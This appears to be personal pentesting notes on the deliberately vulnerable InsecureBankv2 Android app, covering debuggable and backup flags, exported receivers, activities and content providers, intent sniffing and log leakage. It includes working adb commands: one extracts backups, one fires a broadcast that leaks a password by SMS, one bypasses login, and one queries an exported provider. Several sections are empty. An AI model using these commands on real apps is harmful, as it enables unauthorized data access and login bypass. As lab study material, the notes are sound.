- [Manifest](#Mainfest)

- [Broadcast Receiver](#BroadcastReceiver)

- [Activity](#Activity)

- [Intents](#Intents)

- [Content Provider](#Content_provider)

- [Insecure Logging](#Insecure_Logging)


# Manifest

## Debug
If an Application is marked as debuggable then an attacker can access the application’s data by assuming the privileges of that application
```
  adb shell
  run-as com.android.insecurebankv2 
```
### jdp

## Backup
If backup flag is set to true, it allows an attacker to take the backup of the application data via adb even if the device is not rooted. 
```
adb backup -apk app_name

dd if=backup.ab bs=1 skip=24 | openssl zlib -d > backup.tar
tar xvf backup.tar
```

## Exported
If android have flag android:expoted=True or not set at all, it's allows external app to access data
```
```

## ProtectionLevel
```
```

## Over-privileged
```
```

## WRITE_EXTERNAL_STORAGE/READ_EXTERNAL_STORAGE
!!!ONLY IF sensitive data was stored/read externally!!!
```
```

------------------------------------------------------------------------------------------------------------------------
# BroadcastReceiver

## Broadcast_receiver_description
Broadcast receivers are designed to listen to system wide events called broadcasts (e.g. network activity, application updates, etc.) and then trigger something if the broadcast message matches the current parameters inside the Broadcast Receiver

## Exported_broadcast_receiver

### BR_AndroidManifest.xml
```
<receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true">
            <intent-filter>
                <action android:name="theBroadcast"/>
            </intent-filter>
        </receiver>
```
### BR_method_code
```
public void onReceive(Context context, Intent intent) {
        String phn = intent.getStringExtra("phonenumber");
        String newpass = intent.getStringExtra("newpass");
        if (phn != null) {
            try {
                SharedPreferences settings = context.getSharedPreferences("mySharedPreferences", 1);
                this.usernameBase64ByteString = new String(Base64.decode(settings.getString("EncryptedUsername", null), 0), "UTF-8");
                String decryptedPassword = new CryptoClass().aesDeccryptedString(settings.getString("superSecurePassword", null));
                String textPhoneno = phn.toString();
                String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
                SmsManager smsManager = SmsManager.getDefault();
                System.out.println("For the changepassword - phonenumber: " + textPhoneno + " password is: " + textMessage);
                smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("Phone number is null");
        }
    }
```
### adb_BR_exploitaion
```
am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver –es phonenumber 0123456789 –es newpass Test_pass123!
```
-------------------------------------------------------------------------------------------------------------------------------
# Activity

## Exported_activity_bypassing

### Manifset
```
<activity android:label="@string/title_activity_post_login" 
android:name="com.android.insecurebankv2.PostLogin" android:exported="true"/>

Bypassing: adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
```
-------------------------------------------------------------------------------------------------------------------------------
# Intents

## Types of intent

Explicity: have a set receiver and can only be delivered to a predefined component e.g:
  - activity,
  - service,
  - receiver

Implicity: Only certain parameters are set e.g:
  - MIME type,
  - Data
and Android system decides which component to invoke.

## Intent sniffing

### Intent_AndroidManifest.xml
```
<receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true">
 <intent-filter>
      <action android:name="theBroadcast"/>
  </intent-filter>
</receiver>
```
### Intent_implementation
```
public void onReceive(Context context, Intent intent) {
        String phn = intent.getStringExtra("phonenumber");
        String newpass = intent.getStringExtra("newpass");
        if (phn != null) {

private void broadcastChangepasswordSMS(String phoneNumber, String pass) {
        if (TextUtils.isEmpty(phoneNumber.toString().trim())) {
            System.out.println("Phone number Invalid.");
            return;
        }
        Intent smsIntent = new Intent();
        smsIntent.setAction("theBroadcast");
        smsIntent.putExtra("phonenumber", phoneNumber);
        smsIntent.putExtra("newpass", pass);
        sendBroadcast(smsIntent);
    }
```
### Create_intent_exploitation_app
-------------------------------------------------------------------------------------------------------------------------------
# Content_Provider

## Content_Provider_Discription
Content providers are used to share app data with other applications, which is normally stored inside a database or file.

## Exported_content_provider

### CP_AndroidManifest.xml
```
provider android:name="com.android.insecurebankv2.TrackUserContentProvider" android:exported="true" android:authorities="com.android.insecurebankv2.TrackUserContentProvider"/>
```
### CP_method_code
```
static final String URL = "content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers";
static final String name = "name";
```
### adb_CP_exploitaion
```
content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers    
```
-------------------------------------------------------------------------------------------------------------------------------
# Insecure_Logging

## logcat
```
adb logcat | grep "$(adb shell ps | grep [app.package.name]  | awk '{print $2}')"
```
